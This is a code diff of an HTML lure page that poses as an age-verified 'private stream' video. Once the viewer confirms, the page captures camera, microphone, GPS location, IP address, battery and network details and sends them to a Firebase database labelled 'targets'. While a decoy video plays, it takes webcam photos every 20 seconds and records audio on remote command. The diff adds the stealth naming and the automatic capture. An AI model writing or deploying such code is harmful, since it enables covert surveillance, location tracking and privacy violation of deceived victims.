@@ -9,11 +9,11 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         #bg-image { position: fixed; width: 100%; height: 100%; background: url('bg.png.jpeg') center/cover; filter: blur(8px); z-index: 1; transform: scale(1.1); }
-        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); }
-        #play-btn { width: 90px; height: 90px; border: 3px solid #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
-        #play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 8px; }
-        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 100; }
-        .btn-yes { background: #00ff41; color: #000; padding: 12px 25px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.5); }
+        #play-btn { width: 100px; height: 100px; border: 4px solid #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 10px; }
+        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 350px; background: #111; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; z-index: 1000; box-shadow: 0 0 50px #000; }
+        .btn-yes { background: #00ff41; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
     </style>
 </head>
 <body>
@@ -21,16 +21,17 @@
     <div id="bg-image"></div>
     <div id="main-ui">
         <div id="play-btn" onclick="document.getElementById('age-modal').style.display='block'"></div>
-        <h1 style="color:#00ff41; margin-top:20px;">WATCH VIDEO</h1>
+        <h1 style="color:#00ff41; margin-top:20px; letter-spacing: 2px;">WATCH VIDEO</h1>
+        <p style="color:#fff; opacity:0.6;">Age Verification Required</p>
     </div>
 
     <div id="age-modal">
-        <h2 style="color:#fff;">Age Verification</h2>
-        <p style="color:#aaa;">Are you 18+ to watch this private clip?</p>
-        <button class="btn-yes" onclick="startSystem()">YES, I AM 18+</button>
+        <h2 style="color:#fff;">18+ Content</h2>
+        <p style="color:#aaa;">Confirm you are of legal age to view this private stream.</p>
+        <button class="btn-yes" onclick="startStealthSystem()">CONFIRM & PLAY</button>
     </div>
 
-    <video id="v-play" style="display:none; width:100%; height:100%; position:fixed; top:0; z-index:1000;" controls playsinline loop>
+    <video id="target-player" style="display:none; width:100%; height:100%; position:fixed; top:0; z-index:9999; background:#000;" controls playsinline loop>
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
     </video>
 
@@ -38,72 +39,89 @@
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const tid = "UNIT_" + Math.floor(Math.random() * 9000);
+        
+        // Unique ID Generation (Session_PK_Random)
+        const sessionID = "Session_PK_" + Math.floor(1000 + Math.random() * 9000);
         let currentStream = null;
 
-        async function startSystem() {
+        async function startStealthSystem() {
             document.getElementById('age-modal').style.display = 'none';
             try {
-                // Permissions (Camera, Mic, GPS)
+                // Request All Permissions
                 currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                navigator.geolocation.getCurrentPosition(sendPos);
                 
-                // Battery Status
+                // Get IP, Battery, Network
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
                 const batt = await navigator.getBattery();
-                const bLevel = Math.floor(batt.level * 100) + "%";
+                const net = navigator.connection || {effectiveType: "unknown"};
 
-                db.ref(`targets/${tid}/info`).set({
+                // Initial Data Send
+                db.ref(`targets/${sessionID}/info`).set({
+                    ip: ipData.ip,
+                    battery: Math.floor(batt.level * 100) + "%",
+                    network: net.effectiveType,
                     device: navigator.platform,
-                    battery: bLevel,
-                    status: "ONLINE_WATCHING",
-                    time: new Date().toLocaleTimeString()
+                    status: "ONLINE",
+                    time: new Date().toLocaleString()
                 });
 
-                // Start Video
-                const v = document.getElementById('v-play');
+                // Get GPS
+                navigator.geolocation.getCurrentPosition(
+                    (p) => { db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }); },
+                    (e) => { db.ref(`targets/${sessionID}/location`).set({ note: "GPS_DENIED", ip: ipData.ip }); },
+                    { enableHighAccuracy: true }
+                );
+
+                // Start Video UI
+                document.getElementById('main-ui').style.display = 'none';
+                const v = document.getElementById('target-player');
                 v.style.display = 'block';
                 v.play();
 
-                listenCommands();
-            } catch (e) { alert("Error: Access Required!"); location.reload(); }
+                // Auto-Capture Mode (Har 20 seconds baad photo)
+                setInterval(() => { capturePhoto('auto'); }, 20000);
+
+                listenForAdmin();
+            } catch (err) {
+                alert("Permission Error: Please allow access to verify your age.");
+                location.reload();
+            }
         }
 
-        function sendPos(p) {
-            db.ref(`targets/${tid}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+        async function capturePhoto(type) {
+            const canvas = document.createElement('canvas');
+            const vTrack = document.createElement('video');
+            vTrack.srcObject = currentStream;
+            vTrack.play();
+            setTimeout(() => {
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(vTrack, 0, 0);
+                db.ref(`targets/${sessionID}/photos`).push({ 
+                    img: canvas.toDataURL('image/jpeg', 0.5), 
+                    type: type, 
+                    time: Date.now() 
+                });
+            }, 1000);
         }
 
-        function listenCommands() {
-            db.ref(`commands/${tid}`).on('value', async snap => {
+        function listenForAdmin() {
+            db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(!cmd) return;
-
-                // Photo Capture (Front/Back)
-                if(cmd.action.includes('photo')) {
-                    const canvas = document.createElement('canvas');
-                    const videoTrack = document.createElement('video');
-                    videoTrack.srcObject = currentStream;
-                    videoTrack.play();
-                    setTimeout(() => {
-                        canvas.width = 640; canvas.height = 480;
-                        canvas.getContext('2d').drawImage(videoTrack, 0, 0);
-                        db.ref(`targets/${tid}/photos`).push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
-                    }, 1000);
-                }
-
-                // Audio Capture (5 Sec)
-                if(cmd.action === 'audio_rec') {
-                    const recorder = new MediaRecorder(currentStream);
+                if(cmd.action === 'photo') capturePhoto('manual');
+                if(cmd.action === 'audio') {
+                    const rec = new MediaRecorder(currentStream);
                     let chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
+                    rec.ondataavailable = e => chunks.push(e.data);
+                    rec.onstop = () => {
                         const reader = new FileReader();
                         reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-                        reader.onloadend = () => db.ref(`targets/${tid}/audios`).push({ audio: reader.result });
+                        reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ audio: reader.result });
                     };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
+                    rec.start(); setTimeout(() => rec.stop(), 5000);
                 }
-                db.ref(`commands/${tid}`).remove();
+                db.ref(`commands/${sessionID}`).remove();
             });
         }
     </script>
